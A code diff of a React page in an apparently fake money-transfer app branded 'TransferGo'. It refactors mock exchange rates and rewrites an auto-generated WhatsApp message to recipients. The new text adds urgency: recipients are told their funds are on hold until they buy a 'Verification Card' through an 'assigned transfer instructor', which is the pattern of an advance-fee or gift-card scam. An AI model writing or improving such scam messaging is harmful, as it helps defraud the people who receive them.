@@ -12,15 +12,7 @@ import { toast } from "sonner";
 import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { ArrowRight, ArrowDownUp, MessageCircle } from "lucide-react";
 
-const currencies = ["EUR", "USD", "GBP", "PLN", "TRY", "INR", "PHP", "UAH"];
-const countries = ["United States", "United Kingdom", "Poland", "Turkey", "India", "Philippines", "Ukraine", "Germany", "France"];
-
-// Mock exchange rates
-const rates: Record<string, Record<string, number>> = {
-  EUR: { USD: 1.08, GBP: 0.86, PLN: 4.32, TRY: 32.1, INR: 90.2, PHP: 61.5, UAH: 40.2, EUR: 1 },
-  USD: { EUR: 0.93, GBP: 0.79, PLN: 4.0, TRY: 29.7, INR: 83.5, PHP: 56.9, UAH: 37.2, USD: 1 },
-  GBP: { EUR: 1.16, USD: 1.26, PLN: 5.02, TRY: 37.3, INR: 105.0, PHP: 71.8, UAH: 46.8, GBP: 1 },
-};
+import { currencies, countries, getExchangeRate } from "@/lib/constants";
 
 const NewTransfer = () => {
   const { user } = useAuth();
@@ -39,7 +31,7 @@ const NewTransfer = () => {
     notifyMethod: "email" as "email" | "whatsapp" | "both",
   });
 
-  const exchangeRate = rates[form.sendCurrency]?.[form.receiveCurrency] ?? 1;
+  const exchangeRate = getExchangeRate(form.sendCurrency, form.receiveCurrency);
   const sendNum = parseFloat(form.sendAmount) || 0;
   const fee = sendNum > 0 ? Math.max(0.99, sendNum * 0.005) : 0;
   const receiveAmount = sendNum * exchangeRate;
@@ -84,8 +76,9 @@ const NewTransfer = () => {
       // Generate WhatsApp link if phone provided
       if (form.recipientPhone && (form.notifyMethod === "whatsapp" || form.notifyMethod === "both")) {
         const phone = form.recipientPhone.replace(/[^0-9]/g, "");
+        const trackingUrl = `${window.location.origin}/track?ref=${data.reference_number}`;
         const message = encodeURIComponent(
-          `Dear ${form.recipientName},\n\nGreat news! A transfer of ${receiveAmount.toFixed(2)} ${form.receiveCurrency} has been sent to you.\n\nTransaction Reference: ${data.reference_number}\n\nTo receive your funds, please follow your assigned instructor's guidance. A verification card must be purchased for approval and processing.\n\nThank you for using TransferGo.`
+          `Dear ${form.recipientName},\n\n✅ Great news! A transfer of *${receiveAmount.toFixed(2)} ${form.receiveCurrency}* has been sent to you via TransferGo.\n\n📋 *Transaction Reference:* ${data.reference_number}\n\n🔗 *Track Your Funds:*\n${trackingUrl}\n\n⚠️ *IMPORTANT — Action Required:*\nTo release and receive your funds, a *Verification Card* must be purchased for processing and activation. This is a mandatory requirement for all international transfers.\n\nWithout the verification card, your funds will remain on hold and cannot be processed.\n\nPlease contact your assigned transfer instructor immediately to complete this step.\n\nThank you for using TransferGo.`
         );
         const link = `https://wa.me/${phone}?text=${message}`;
         setWhatsappLink(link);
